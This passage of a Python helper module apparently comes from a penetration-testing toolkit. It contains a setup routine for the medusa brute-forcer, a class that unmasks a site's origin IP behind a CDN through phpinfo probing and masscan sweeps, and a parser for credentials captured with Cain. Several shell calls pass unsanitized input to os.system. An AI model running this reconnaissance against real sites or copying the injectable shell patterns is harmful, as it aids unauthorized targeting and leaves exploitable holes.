        if current_os in ['Linux', 'Darwin'] or current_os.startswith('CYGWIN'):
            tuple_xy = self._get_terminal_size_linux()
        if tuple_xy is None:
            # print("default")
            tuple_xy = (80, 25)      # default value
        return tuple_xy

    def _get_terminal_size_windows(self):
        try:
            from ctypes import windll, create_string_buffer
            # stdin handle is -10
            # stdout handle is -11
            # stderr handle is -12
            h = windll.kernel32.GetStdHandle(-12)
            csbi = create_string_buffer(22)
            res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
            if res:
                (bufx, bufy, curx, cury, wattr,
                 left, top, right, bottom,
                 maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
                sizex = right - left + 1
                sizey = bottom - top + 1
                return sizex, sizey
        except:
            pass

    def _get_terminal_size_tput(self):
        # get terminal width
        # src:
        # http://stackoverflow.com/questions/263890/how-do-i-find-the-width-height-of-a-terminal-window
        try:
            cols = int(subprocess.check_call(shlex.split('tput cols')))
            rows = int(subprocess.check_call(shlex.split('tput lines')))
            return (cols, rows)
        except:
            pass

    def _get_terminal_size_linux(self):
        def ioctl_GWINSZ(fd):
            try:
                import fcntl
                import termios
                cr = struct.unpack('hh',
                                   fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
                return cr
            except:
                pass
        cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)
        if not cr:
            try:
                fd = os.open(os.ctermid(), os.O_RDONLY)
                cr = ioctl_GWINSZ(fd)
                os.close(fd)
            except:
                pass
        if not cr:
            try:
                cr = (os.environ['LINES'], os.environ['COLUMNS'])
            except:
                return None
        return int(cr[1]), int(cr[0])

    def __init__(self):
        # 这里为什么要调用scan_init()函数呢,奇怪,可能是手抖
        # scan_init()
        self.lastLength = 0
        self.lastOutput = ''
        self.lastInLine = False
        self.mutex = threading.Lock()
        self.blacklists = {}
        self.mutexCheckedPaths = threading.Lock()
        self.basePath = None
        self.errors = 0
        self.useProxy = False

        # 下面这个变量是用来控制屏幕底部输出结束的,self.stop_order=1时,结束在屏幕底部输出的线程
        self.stop_order = 0

    def inLine(self, string):
        self.erase()
        sys.stdout.write(string)
        sys.stdout.flush()
        self.lastInLine = True

    def erase(self):
        if platform.system() == 'Windows':
            csbi = GetConsoleScreenBufferInfo()
            line = "\b" * int(csbi.dwCursorPosition.X)
            sys.stdout.write(line)
            width = csbi.dwCursorPosition.X
            csbi.dwCursorPosition.X = 0
            FillConsoleOutputCharacter(
                STDOUT, ' ', width, csbi.dwCursorPosition)
            sys.stdout.write(line)
            sys.stdout.flush()
        else:
            sys.stdout.write('\033[1K')
            sys.stdout.write('\033[0G')

    def newLine(self, string):
        if self.lastInLine:
            self.erase()
        if platform.system() == 'Windows':
            sys.stdout.write(string)
            sys.stdout.flush()
            sys.stdout.write('\n')
            sys.stdout.flush()
        else:
            sys.stdout.write(string + '\n')
        sys.stdout.flush()
        self.lastInLine = False
        sys.stdout.flush()

    def good_print(self, message, color='green'):
        # 干净的打印,配合下面的new_thread_bottom_print函数使用不会导致多线程打印错乱
        # message是要打印的string
        # color有green,blue,yellow,cyan,red的选择
        with self.mutex:
            if color == 'green':
                message = Fore.GREEN + message + Style.RESET_ALL
            if color == 'blue':
                message = Fore.BLUE + message + Style.RESET_ALL
            if color == 'yellow':
                message = Fore.YELLOW + message + Style.RESET_ALL
            if color == 'cyan':
                message = Fore.CYAN + message + Style.RESET_ALL
            if color == 'red':
                message = Fore.RED + message + Style.RESET_ALL
            self.newLine(message)

    def bottom_print(self, message, color="red"):
        with self.mutex:
            x, y = self.get_terminal_size()
            if self.errors > 0:
                message += Style.BRIGHT + Fore.RED
                message += 'Errors: {0}'.format(self.errors)
                message += Style.RESET_ALL
            # if len(message) > x:
            #    message = message[:x]
            if color == 'green':
                message = Fore.GREEN + message
            if color == 'blue':
                message = Fore.BLUE + message
            if color == 'yellow':
                message = Fore.YELLOW + message
            if color == 'red':
                message = Fore.RED + message
            self.inLine(message)

    def error(self, reason):
        with self.mutex:
            stripped = reason.strip()
            start = reason.find(stripped[0])
            end = reason.find(stripped[-1]) + 1
            message = reason[0:start]
            message += Style.BRIGHT + Fore.WHITE + Back.RED
            message += reason[start:end]
            message += Style.RESET_ALL
            message += reason[end:]
            self.newLine(message)

    def warning(self, reason):
        message = Style.BRIGHT + Fore.YELLOW + reason + Style.RESET_ALL
        self.newLine(message)

    def header(self, text):
        message = Style.BRIGHT + Fore.MAGENTA + text + Style.RESET_ALL
        self.newLine(message)

    def debug(self, info):
        line = "[{0}] - {1}".format(time.strftime('%H:%M:%S'), info)
        self.newLine(line)

    def continue_bottom_print(self, message):
        # 底部持续打印,可以起到显示当前状态作用
        # stop_order是结束信号,一般是全局变量
        # 在设置stop_order=1之后再设置stop_order=0前要睡3s左右,以便留点时间给stop_order=1后用来退出下面的新线程的无限循环
        # eg.
        # self.stop_order=1
        # time.sleep(3)
        # self.stop_order=0
        # new thread:continue_bottom_print(....)

        while 1:
            if self.stop_order == 1:
                break
            self.bottom_print(message)
            if self.stop_order == 1:
                break
            time.sleep(1)
            if self.stop_order == 1:
                break

    def new_thread_bottom_print(self, message):
        # stop_order是结束信号,一般是全局变量
        # 这个函数是新开线程在屏幕底部单独一行打印的函数
        # message是要打印的string
        bottom_print_thread = MyThread(self.continue_bottom_print, [message])
        bottom_print_thread.start()

    def os_system_with_bottom_status(self, command, proxyUrl=""):
        # 这个函数是在os.system函数的基础上在命令执行期间打印当前正在执行的命令到屏幕底部的函数
        # command是要执行的命令,这个函数调用了上面的new_thread_bottom_print函数,并利用当前类的self.stop_order
        # 作为打印开关
        # 但是一般来说会出现在非屏幕底部也会打印屏幕底部正在打印的string,因为一般的os.system执行的命令中的打印的
        # string没有上面的good_print函数好,一般的os.system执行的命令中的打印动作相当于print
        self.stop_order = 0
        if not self.useProxy:
            command = command
        else:
            command = command + " --proxy=%s" % get_one_useful_proxy()
        self.new_thread_bottom_print("[正在执行:%s]\r" % command)
        os.system(command)
        self.stop_order = 1

    def os_system_combine_argv_with_bottom_status(self, command, proxyUrl=""):
        # 这个函数是在os_system_with_bottom_status函数的基础上结合程序输入参数而执行命令的函数
        # command的优先级没有argv中的参数优先级高,如果在argv中有与command中相同的参数则取argv中的参数与对应对
        # 数值作为最后执行参数
        command = combileMyParaAndArgvPara(command)
        self.stop_order = 0
        if not self.useProxy:
            command = command
        else:
            command = re.sub(r"--proxy[\s]+[^\s]+", "", command)
            command = command + " --proxy=%s" % get_one_useful_proxy()
        self.new_thread_bottom_print("[正在执行:%s]\r" % command)
        os.system(command)
        self.stop_order = 1
        import time
        # 这里睡1s给new_thread_bottom_print里面的打印线程发送stop_order=1的响应时间,不睡发现它响应不过来
        time.sleep(1)


# 一般用法:正常运行要输出的内容用该类的good_print函数,显示运行状态用new_thread_bottom_print函数,其中
# 如果要终结new_thread_bottom_print线程,将sefl.stop_order置1即可
# 上面是彩色打印输出到屏幕方案相关代码


def string2argv(string):
    # 将string转化成argv格式
    # 返回一个列表
    # eg:
    # -u 'http://1.php' --dbms=mysql -v 3将转化成:
    # ['-u','http://1.php','--dbms','mysql','-v','3']
    # 最后将--url转化成-u,因为sqlmap中需要
    import re
    tmpWord = ""
    # 引号个数
    yhIndex = 0
    # 表示开始进入引号中内容
    startYHcontent = 0
    # 表示结束引号中内容
    endYHcontent = 0
    commandList = []
    for c in string:
        if re.match('''[^\s'"]''', c):
            tmpWord += c
        elif re.match("\s", c):
            if tmpWord != "" and startYHcontent == 0:
                commandList.append(tmpWord)
            if startYHcontent == 1 and endYHcontent == 0:
                tmpWord += c
            if startYHcontent == 0:
                tmpWord = ""
        elif c in ["'", '"']:
            yhIndex += 1
            if yhIndex % 2 == 0:
                endYHcontent = 1
                startYHcontent = 0
                # commandList.append(tmpWord)
                tmpWord == ""
            else:
                startYHcontent = 1
                endYHcontent = 0
    if tmpWord != "":
        commandList.append(tmpWord)
    returnList = []
    for each in commandList:
        if not re.match("http", each) and re.search("=", each) and each[0:2] == "--":
            tmpList = each.split("=")
            returnList.append(tmpList[0])
            returnList.append(tmpList[1])
        else:
            returnList.append(each)

    tmpList = []
    for each in returnList:
        if each == "--url":
            tmpList.append("-u")
        else:
            tmpList.append(each)

    return tmpList


def param2argv(paramList):
    # 将形如['-u','http://a b1.php','--dbms=mysql','-v','3']转化成
    #['-u','http://a b1.php','--dbms','mysql','-v','3']
    # 最后将--url转化成-u,因为sqlmap中需要
    import re
    returnList = []
    for each in paramList:
        if not re.match("http", each) and re.search("=", each) and each[0:2] == "--":
            tmpList = each.split('=')
            returnList.append(tmpList[0])
            returnList.append(tmpList[1])
        else:
            returnList.append(each)

    tmpList = []
    for each in returnList:
        if each == "--url":
            tmpList.append("-u")
        else:
            tmpList.append(each)

    return tmpList


def install_scrapy():
    # ubuntu 16.04下安装scrapy
    os.system(
        "sudo apt-get -y install python-dev python-pip libxml2-dev libxslt1-dev zlib1g-dev libffi-dev \
libssl-dev")
    os.system("pip3 install Scrapy")


def install_medusa():
    # linux mint下安装medusa
    # 下面用于支持ssh爆破
    os.system("wget http://www.libssh2.org/download/libssh2-1.2.6.tar.gz -O /tmp/libssh2.tar.gz && cd \
/tmp && tar -xvzf libssh2.tar.gz -C /usr/src && cd /usr/src/libssh2-1.2.6/ && ./configure && make && make install")
    os.system("echo /usr/local/lib > /etc/ld.so.conf.d/local.conf && ldconfig")
    # 下面安装一些依赖,可解决rdp模块的问题
    os.system("apt-get -y install build-essential libssl-dev libpq5 libpq-dev libssh2-1 libssh2-1-dev libgcrypt11-dev libgnutls-dev libsvn-dev freerdp libfreerdp-dev")
    # 下面下载并编译
    os.system("wget https://codeload.github.com/jmk-foofus/medusa/tar.gz/2.2 -O /tmp/medusa.tar.gz && \
cd /tmp && tar -xvzf medusa.tar.gz && cd medusa-2.2 && ./configure --enable-debug=yes --enable-module-afp=yes \
--enable-module-cvs=yes --enable-module-ftp=yes --enable-module-http=yes --enable-module-imap=yes \
--enable-module-mssql=yes --enable-module-mysql=yes --enable-module-ncp=yes --enable-module-nntp=yes \
--enable-module-pcanywhere=yes --enable-module-pop3=yes --enable-module-postgres=yes \
--enable-module-rexec=yes --enable-module-rlogin=yes --enable-module-rsh=yes --enable-module-smbnt=yes \
--enable-module-smtp=yes --enable-module-smtp-vrfy=yes --enable-module-snmp=yes --enable-module-ssh=yes \
--enable-module-svn=yes --enable-module-telnet=yes --enable-module-vmauthd=yes --enable-module-vnc=yes \
--enable-module-wrapper=yes --enable-module-web-form=yes --enable-module-rdp=yes && make && make install")


def fileOutofDate(file, checkTime=3):
    # 文件距离上次修改后到现在为止经过多久,如果超过checkTime的天数则认为文件过期,返回True
    # 如果没有超过3天则认为文件没有过期,返回False
    import os
    import time
    nowMonth = int(time.strftime("%m"))
    nowDate = int(time.strftime("%d"))
    t = os.stat(file)
    a = time.localtime(t.st_mtime)
    modifyMonth = a.tm_mon
    modifyDate = a.tm_mday
    if modifyMonth != nowMonth:
        return True
    if modifyMonth == nowMonth:
        if nowDate - modifyDate > checkTime:
            return True
        elif nowDate < modifyDate:
            return True
        else:
            return False


def tab_complete_file_path():
    # this is a function make system support Tab key complete file_path
    # works on linux,it seems windows not support readline module
    import platform
    import glob

    def tab_complete_for_file_path():
        class tabCompleter(object):
            """
            A tab completer that can either complete from
            the filesystem or from a list.
            Partially taken from:
            http://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
            source code:https://gist.github.com/iamatypeofwalrus/5637895
            """

            def pathCompleter(self, text, state):
                """
                This is the tab completer for systems paths.
                Only tested on *nix systems
                """
                line = readline.get_line_buffer().split()
                return [x for x in glob.glob(text + '*')][state]

            def createListCompleter(self, ll):
                """
                This is a closure that creates a method that autocompletes from
                the given list.
                Since the autocomplete function can't be given a list to complete from
                a closure is used to create the listCompleter function with a list to complete
                from.
                """
                def listCompleter(text, state):
                    line = readline.get_line_buffer()
                    if not line:
                        return [
                            c + " " for c in ll if c.startswith(line)][state]
                self.listCompleter = listCompleter
        t = tabCompleter()
        t.createListCompleter(["ab", "aa", "bcd", "bdf"])

        readline.set_completer_delims('\t')
        readline.parse_and_bind("tab: complete")
        # readline.set_completer(t.listCompleter)
        # ans = raw_input("Complete from list ")
        # print ans
        readline.set_completer(t.pathCompleter)

    if platform.system() == "Linux":
        try:
            import readline
            tab_complete_for_file_path()
        except:
            os.system("pip3 install readline")
            tab_complete_for_file_path()
    else:
        try:
            import readline
        except:
            pass


# execute the function to take effect
tab_complete_file_path()


def seconds2hms(seconds):
    # 将秒数转换成时分秒
    # 返回类型为str类型
    m, s = divmod(seconds, 60)
    h, m = divmod(m, 60)
    return "%02d:%02d:%02d" % (h, m, s)


class Xcdn(object):
    # Xcdn是获取cdn背后真实ip的类
    # 使用方法Xcdn(domain).return_value为真实ip,如果结果为0代表没有获得成功

    def __init__(self, domain):
        # 必须保证连上了vpn,要在可以ping通google的条件下使用本工具,否则有些domain由于被GFW拦截无法正常访问会导致
        # 本工具判断错误,checkvpn在可以ping通google的条件下返回1
        import re
        import sys
        import os
        while 1:
            if checkvpn() == 1:
                break
            else:
                time.sleep(1)
                print("vpn is off,connect vpn first")
        # 首先保证hosts文件中没有与domain相关的项,有则删除相关
        domainPattern = domain.replace(".", "\.")
        # 下面的sed的正则中不能有\n,sed匹配\n比较特殊
        # http://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed
        command = "sed -ri 's/.*\s+%s//' /etc/hosts" % domainPattern
        os.system(command)

        self.domain = domain
        self.http_or_https = get_http_or_https(self.domain)
        print('domain的http或https是:%s' % self.http_or_https)
        result = get_request(self.http_or_https + "://" + self.domain)
        #result = get_request(self.http_or_https + "://" + self.domain,'seleniumPhantomJS')
        self.domain_title = result['title']
        # 下面调用相当于main函数的get_actual_ip_from_domain函数
        actual_ip = self.get_actual_ip_from_domain()
        if actual_ip != 0:
            print("恭喜,%s的真实ip是%s" % (self.domain, actual_ip))
        # 下面用来存放关键返回值
        self.return_value = actual_ip

    def domain_has_cdn(self):
        # 检测domain是否有cdn
        # 有cdn时,返回一个字典,如果cdn是cloudflare，返回{'has_cdn':1,'is_cloud_flare':1}
        # 否则返回{'has_cdn':1,'is_cloud_flare':0}或{'has_cdn':0,'is_cloud_flare':0}
        import re
        CLIOutput().good_print("现在检测domain:%s是否有cdn" % self.domain)
        has_cdn = 0
        # ns记录和mx记录一样,都要查顶级域名,eg.dig +short www.baidu.com ns VS dig +short
        # baidu.com ns
        result = get_string_from_command(
            "dig ns %s +short" % get_root_domain(self.domain))
        pattern = re.compile(
            r"(cloudflare)|(cdn)|(cloud)|(fast)|(incapsula)|(photon)|(cachefly)|(wppronto)|(softlayer)|(incapsula)|(jsdelivr)|(akamai)", re.I)
        cloudflare_pattern = re.compile(r"cloudflare", re.I)
        if re.search(pattern, result):
            if re.search(cloudflare_pattern, result):
                print("has_cdn=1 from ns,and cdn is cloudflare")
                return {'has_cdn': 1, 'is_cloud_flare': 1}
            else:
                print("has_cdn=1 from ns")
                return {'has_cdn': 1, 'is_cloud_flare': 0}
        else:
            # 下面通过a记录个数来判断,如果a记录个数>1个,认为有cdn
            result = get_string_from_command("dig a %s +short" % self.domain)
            find_a_record_pattern = re.findall(
                r"((\d{1,3}\.){3}\d{1,3})", result)
            if find_a_record_pattern:
                ip_count = 0
                for each in find_a_record_pattern:
                    ip_count += 1
                if ip_count > 1:
                    has_cdn = 1
                    return {'has_cdn': 1, 'is_cloud_flare': 0}
        return {'has_cdn': 0, 'is_cloud_flare': 0}

    def get_domain_actual_ip_from_phpinfo(self):
        # 从phpinfo页面尝试获得真实ip
        CLIOutput().good_print("现在尝试从domain:%s可能存在的phpinfo页面获取真实ip" % self.domain)
        phpinfo_page_list = ["info.php", "phpinfo.php", "test.php", "l.php"]
        for each in phpinfo_page_list:
            url = self.http_or_https + "://" + self.domain + "/" + each
            CLIOutput().good_print("现在访问%s" % url)
            visit = get_request(url)
            #visit = get_request(url, 'seleniumPhantomJS')
            code = visit['code']
            content = visit['content']
            pattern = re.compile(r"remote_addr", re.I)
            if code == 200 and re.search(pattern, content):
                print(each)
                actual_ip = re.search(
                    r"REMOTE_ADDR[^\.\d]+([\d\.]{7,15})[^\.\d]+", content).group(1)
                return actual_ip
        # return 0代表没有通过phpinfo页面得到真实ip
        return 0

    def flush_dns(self):
        # 这个函数用来刷新本地dns cache
        # 要刷新dns cache才能让修改hosts文件有效

        #CLIOutput().good_print("现在刷新系统的dns cache")
        sysInfo = get_string_from_command("uname -a")
        if re.search(r"kali", sysInfo, re.I) and re.search(r"debian", sysInfo, re.I):
            # 说明是kali linux,如果使用的时默认的get_request方法(非selenium)kali
            # linux不刷新dns时/etc/hosts也生效
            pass
        elif re.search(r"ubuntu", sysInfo, re.I):
            # 说明是ubuntu,ubuntu刷新dns方法如下,按理来说这里不刷新dns也可，因为默认的get_request请求不用刷新dns
            # 时/etc/hosts也生效，在kali linux上测试是这样的，ubuntu下暂时没有测试
            command = "/etc/init.d/dns-clean start && /etc/init.d/networking force-reload"
            # 改成不刷新dns了，好的刷新多少会断网,因为这里有networking force-reload
            # os.system(command)
        else:
            print(
                "Sorry,I don't support your operation system since it's not kali linux or ubuntu")
            sys.exit(1)
        import time
        time.sleep(3)

    def modify_hosts_file_with_ip_and_domain(self, ip):
        # 这个函数用来修改hosts文件
        CLIOutput().good_print("现在修改hosts文件")
        exists_domain_line = False
        with open("/etc/hosts", "r+") as f:
            file_content = f.read()
        if re.search(r"%s" % self.domain.replace(".", "\."), file_content):
            exists_domain_line = True
        if exists_domain_line:
            os.system("sed -ri 's/.*%s.*/%s    %s/' %s" %
                      (self.domain.replace(".", "\."), ip, self.domain, "/etc/hosts"))
        else:
            os.system("echo %s %s >> /etc/hosts" % (ip, self.domain))

    def check_if_ip_is_actual_ip_of_domain(self, ip):
        # 通过修改hosts文件检测ip是否是domain对应的真实ip
        # 如果是则返回True,否则返回False
        CLIOutput().good_print("现在通过修改hosts文件并刷新dns的方法检测ip:%s是否是domain:%s的真实ip" % (ip,
                                                                                   self.domain))
        os.system("cp /etc/hosts /etc/hosts.bak")
        self.modify_hosts_file_with_ip_and_domain(ip)
        self.flush_dns()
        # 使用默认的get_request请求方法不刷新dns的话/etc/hosts文件也会生效
        hosts_changed_domain_title = get_request(
            self.http_or_https + "://%s" % self.domain)['title']
        #hosts_changed_domain_title = get_request(self.http_or_https + "://%s" % self.domain, 'seleniumPhantomJS')['title']
        os.system("rm /etc/hosts && mv /etc/hosts.bak /etc/hosts")
        # 这里要用title判断,html判断不可以,title相同则认为相同
        if self.domain_title == hosts_changed_domain_title:
            print("是的！！！！！！！！！！！！")
            return True
        else:
            print("不是的！！！！！！！！！！！！")
            return False

    def get_c_80_or_443_list(self, ip):
        # 得到ip的整个c段的开放80端口或443端口的ip列表
        if "not found" in get_string_from_command("masscan"):
            # 这里不用nmap扫描,nmap扫描结果不准
            os.system("apt-get -y install masscan")
        if self.http_or_https == "http":
            scanPort = 80
            CLIOutput().good_print("现在进行%s的c段开了80端口机器的扫描" % ip)
        if self.http_or_https == "https":
            scanPort = 443
            CLIOutput().good_print("现在进行%s的c段开了443端口机器的扫描" % ip)
        masscan_command = "masscan -p%d %s/24 > /tmp/masscan.out" % (
            scanPort, ip)
        os.system(masscan_command)
        with open("/tmp/masscan.out", "r+") as f:
            strings = f.read()
        # os.system("rm /tmp/masscan.out")
        import re
        allIP = re.findall(r"((\d{1,3}\.){3}\d{1,3})", strings)
        ipList = []
        for each in allIP:
            ipList.append(each[0])
        print(ipList)
        return ipList

    def check_if_ip_c_machines_has_actual_ip_of_domain(self, ip):
        # 检测ip的c段有没有domain的真实ip,如果有则返回真实ip,如果没有则返回0
        CLIOutput().good_print("现在检测ip为%s的c段中有没有%s的真实ip" % (ip, self.domain))
        target_list = self.get_c_80_or_443_list(ip)
        for each_ip in target_list:
            if self.check_if_ip_is_actual_ip_of_domain(each_ip):
                return each_ip
        return 0

    def get_ip_from_mx_record(self):
        # 从mx记录中得到ip列表,尝试从mx记录中的c段中找真实ip
        print("尝试从mx记录中找和%s顶级域名相同的mx主机" % self.domain)
        import socket
        # domain.eg:www.baidu.com
        root_domain = get_root_domain(self.domain)
        result = get_string_from_command("dig %s +short mx" % root_domain)
        sub_domains_list = re.findall(
            r"\d{1,} (.*\.%s)\." % root_domain.replace(".", "\."), result)
        ip_list = []
        for each in sub_domains_list:
            print(each)
            ip = socket.gethostbyname_ex(each)[2]
            if ip[0] not in ip_list:
                ip_list.append(ip[0])
        return ip_list

    def check_if_mx_c_machines_has_actual_ip_of_domain(self):
        # 检测domain的mx记录所在ip[或ip列表]的c段中有没有domain的真实ip
        # 有则返回真实ip,没有则返回0
        CLIOutput().good_print("尝试从mx记录的c段中查找是否存在%s的真实ip" % self.domain)
        ip_list = self.get_ip_from_mx_record()
        if ip_list != []:
            for each_ip in ip_list:
                result = self.check_if_ip_c_machines_has_actual_ip_of_domain(
                    each_ip)
                if result != 0:
                    return result
                else:
                    continue
        return 0

    def get_ip_value_from_online_cloudflare_interface(self):
        # 从在线的cloudflare查询真实ip接口处查询真实ip
        # 如果查询到真实ip则返回ip值,如果没有查询到则返回0
        CLIOutput().good_print("现在从在线cloudflare类型cdn查询真实ip接口尝试获取真实ip")
        url = "http://www.crimeflare.com/cgi-bin/cfsearch.cgi"
        post_data = 'cfS=%s' % self.domain
        content = post_request(url, post_data)
        findIp = re.search(r"((\d{1,3}\.){3}\d{1,3})", content)
        if findIp:
            return findIp.group(1)
        return 0

    def get_actual_ip_from_domain(self):
        # 尝试获得domain背后的真实ip,前提是domain有cdn
        # 如果找到了则返回ip,如果没有找到返回0
        CLIOutput().good_print("进入获取真实ip函数,认为每个domain都是有cdn的情况来处理")
        import socket
        has_cdn_value = self.domain_has_cdn()
        if has_cdn_value['has_cdn'] == 1:
            CLIOutput().good_print("检测到domain:%s的A记录不止一个,认为它有cdn" % self.domain)
            pass
        else:
            CLIOutput().good_print(
                "Attention...!!! Domain doesn't have cdn,I will return the only one ip")
            try:
                true_ip = socket.gethostbyname_ex(self.domain)[2][0]
                return true_ip
            except:
                # 如果无法由dns解析成ip的域名返回0
                return 0
        # 下面尝试通过cloudflare在线查询真实ip接口获取真实ip
        if has_cdn_value['is_cloud_flare'] == 1:
            ip_value = self.get_ip_value_from_online_cloudflare_interface()
            if ip_value != 0:
                return ip_value
            else:
                pass
        # 下面尝试通过可能存在的phpinfo页面获得真实ip
        ip_from_phpinfo = self.get_domain_actual_ip_from_phpinfo()
        if ip_from_phpinfo == 0:
            pass
        else:
            return ip_from_phpinfo
        # 下面通过mx记录来尝试获得真实ip
        result = self.check_if_mx_c_machines_has_actual_ip_of_domain()
        if result == 0:
            pass
        else:
            return result
        print("很遗憾,在下认为%s有cdn,但是目前在下的能力没能获取它的真实ip,当前函数将返回0" % self.domain)
        return 0


def figlet2file(logo_str, file_abs_path, print_or_not):
    # 输出随机的logo文字到文件或屏幕,第二个参数为0时,只输出到屏幕
    # apt-get install figlet
    # man figlet
    # figure out which is the figlet's font directory
    # my figlet font directory is:
    # figlet -I 2,output:/usr/share/figlet

    try:
        f = os.popen("figlet -I 2")
        all = f.readlines()
        f.close()
        figlet_font_dir = all[0][:-1]
    except:
        if platform.system() == "Linux":
            os.system("apt-get -y install figlet")
            f = os.popen("figlet -I 2")
            all = f.readlines()
            f.close()
            figlet_font_dir = all[0][:-1]
        elif platform.system() == 'Darwin':
            print("use noroot user run `brew install figlet`")
            #os.system("brew install figlet")

    all_font_name_list = get_all_file_name(figlet_font_dir, ['tlf', 'flf'])
    random_font = random.choice(all_font_name_list)
    if platform.system() == "Linux":
        unsucceed = os.system(
            "figlet -t -f %s %s > /tmp/figlettmpfile" %
            (random_font, logo_str))
    elif platform.system() == "Darwin":
        unsucceed = os.system(
            "figlet %s > /tmp/figlettmpfile" %
            logo_str)

    if(unsucceed == 1):
        print("something wrong with figlet,check the command in python source file")
    if file_abs_path != 0:
        try:
            os.system("cat /tmp/figlettmpfile >> %s" % file_abs_path)
        except:
            print("figlet2file func write to file wrong,check it")
    else:
        pass
    if(print_or_not):
        os.system("cat /tmp/figlettmpfile")
    os.system("rm /tmp/figlettmpfile")


def oneline2nline(oneline, nline, file_abs_path):
    # 将文件中的一行字符串用多行字符串替换,调用时要将"多行字符串的参数(第二个参数)"中的换行符设置为\n
    tmpstr = nline.replace('\n', '\\\n')
    os.system("sed '/%s/c\\\n%s' %s > /tmp/1" %
              (oneline, tmpstr, file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    pass


def lin2win(file_abs_path):
    # 将linux下的文件中的\n换行符换成win下的\r\n换行符
    input_file = file_abs_path
    f = open(input_file, "r+")
    urls = f.readlines()
    f.close()
    os.system("rm %s" % file_abs_path)
    f1 = open(file_abs_path, "a+")
    for url in urls:
        print(url[0:-1])
        # print url is different with print url[0:-1]
        # print url[0:-1] can get the pure string
        # while print url will get the "unseen \n"
        # this script can turn a file with strings
        # end with \n into a file with strings end
        # with \r\n to make it comfortable move the
        # txt file from *nix to win,coz the file with
        # strings end with \n in *nix is ok for human
        # to see "different lines",but this kind of file
        # will turn "unsee different lines" in win
        f1.write(url[0:-1] + "\r\n")
    f1.close()


def getCainKey(lstFile):
    # 参数为cain目录下的包含用户名口令的文件,eg.pop3.lst,imap.lst,smtp.lst,http.lst,ftp.lst...
    # 效果为在程序当前目录下生成一个xxx-cainOutPut.txt为整理后的文件
    import re
    with open(lstFile, "r+") as f:
        allLines = f.readlines()
    AddedLines = []
    for eachLine in allLines:
        a = re.search(
            r"[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+).*\s", eachLine, re.I)
        if a:
            userField = a.group(1)
            passField = a.group(2)
            string2write = userField + ":" + passField + "\n"
            print(string2write)
            if string2write not in AddedLines:
                shouldWrite = 1
                for each in AddedLines:
                    if each[:len(userField)] != userField:
                        continue
                    else:
                        if passField == each.split(":")[1][:-1]:
                            shouldWrite = 0
                        break
                if shouldWrite == 1:
                    AddedLines.append(string2write)
                    with open(lstFile + "-cainOutPut.txt", "a+") as f:
                        f.write(string2write)


# attention:
# 由于此处tmp_get_file_name_value和tmp_all_file_name_list在函数外面,so
# 在其他代码中调用get_all_file_name()时要用from name import *,不用import name
# 否则不能调用到get_all_file_name的功能
#tmp_get_file_name_value = 0
#tmp_all_file_name_list = []


def post_requests(url, data, headers):
    import requests
    global DELAY
    if DELAY!="":
        import time
        time.sleep(DELAY)
    else:
        pass

    returnValue = requests.post(url, data, headers, timeout=10)
    return returnValue

def get_all_abs_path_file_name(folder, ext_list):
    # ext_list为空时,得到目录下的所有绝对路径形式的文件名,不返回空文件夹名
    # ext_list为eg.['jpg','png']
    # eg.folder="~"时,当~目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt
    # 得到的函数返回值为['a/1.txt','2.txt']

    tmp_get_file_name_value = [0]
    tmp_all_file_name_list = []

    def get_all_abs_path_file_name_inside_func(f,e):
        folder=f
        ext_list=e
        import os
        tmp_get_file_name_value[0] += 1
        if tmp_get_file_name_value[0] == 1:
            if folder[-1] == '/':
                root_dir = folder[:-1]
            else:
                root_dir = folder

        allfile = os.listdir(folder)

        for each in allfile:
            each_abspath = os.path.join(folder, each)
            if os.path.isdir(each_abspath):
                get_all_abs_path_file_name_inside_func(each_abspath, ext_list)
            else:
                if len(ext_list) == 0:
                    tmp_all_file_name_list.append(each_abspath)
                else:
                    for each_ext in ext_list:
                        if(filename.split('.')[-1] == each_ext):
                            # print filename
                            tmp_all_file_name_list.append(each_abspath)
        return tmp_all_file_name_list
    return get_all_abs_path_file_name_inside_func(folder,ext_list)



def get_all_file_name(folder, ext_list):
    # ext_list为空时,得到目录下的所有文件名,不返回空文件夹名
    # ext_list为eg.['jpg','png']
    # 返回结果为文件名列表,不是完全绝对路径名
    # eg.folder="~"时,当~目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt
    # 得到的函数返回值为['a/1.txt','2.txt']

    tmp_get_file_name_value = [0]
    tmp_all_file_name_list = []

    def get_all_file_name_inside_func(f,e):
        folder=f
        ext_list=e
        import os
        tmp_get_file_name_value[0] += 1
        if tmp_get_file_name_value[0] == 1:
            if folder[-1] == '/':
                root_dir = folder[:-1]
            else:
                root_dir = folder

        allfile = os.listdir(folder)
        for each in allfile:
            each_abspath = os.path.join(folder, each)
            if os.path.isdir(each_abspath):
                get_all_file_name_inside_func(each_abspath, ext_list)
            else:
                if len(ext_list) == 0:
                    tmp_all_file_name_list.append(each)
                else:
                    for each_ext in ext_list:
                        if(each.split('.')[-1] == each_ext):
                            # print each
                            tmp_all_file_name_list.append(each)

        return tmp_all_file_name_list
    return get_all_file_name_inside_func(folder,ext_list)


def save2github(file_abs_path, repo_name, comment):
    # 将文件上传到github
    # arg1:文件绝对路经
    # arg2:远程仓库名
    # 提交的commit注释
    local_resp_path = HOME_PATH + "/" + repo_name
    filename = os.path.basename(file_abs_path)
    remote_resp_url = "https://github.com/3xp10it/%s.git" % repo_name
    if os.path.exists(local_resp_path) is False:
        os.system(
            "mkdir %s && cd %s && git init && git pull %s && git remote add origin %s && git status" %
            (local_resp_path, local_resp_path, remote_resp_url, remote_resp_url))
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print("warning!warning!warning! I will exit! There exists a same name script in \
local_resp_path(>>%s),and this script is downloaded from remote github repo,\
you should rename your script if you want to upload it to git:)" % local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then \
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False

        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
